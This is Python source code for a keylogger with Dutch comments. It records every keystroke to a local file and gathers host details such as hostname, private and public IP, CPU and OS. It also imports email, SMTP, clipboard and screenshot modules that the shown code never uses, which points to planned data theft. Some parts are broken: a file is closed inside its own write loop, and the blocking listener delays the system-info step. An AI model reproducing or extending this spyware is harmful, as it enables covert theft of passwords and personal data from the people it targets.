# Modules
import re
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from pathlib import Path

# Variabelen keylogger

key_log = "key_log.txt"
path_directory = Path(__file__)
path_keylog = str(path_directory).replace("main.py", "key_log.txt")
path_keylog_formatted = re.escape(str(path_keylog))

count = 0
keys = []

# Variabelen voor systeeminformatie
sytem_info = "systeminfo.txt"
path_system = str(path_directory).replace("main.py", "systeminfo.txt")
path_system_formatted = re.escape(str(path_system))
print(path_system_formatted)


# Functies keylogger

def on_press(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_log(keys)
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


def write_log(keys):
    with open(path_keylog, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


# Functies systeeminfo

def system_info():
    with open(path_system, "a") as f:
        hostname = socket.gethostname()
        IP = socket.gethostbyname(hostname)
        try:
            public_IP = get("https://api.apify.org").text
            f.write("Public IP: " + public_IP)
        except Exception:
            f.write("Kon public IP adres niet ophalen.")
        f.write("CPU Info: " + (platform.processor()) + "\n")
        f.write("OS info: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine info: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP: " + IP + "\n")

system_info()
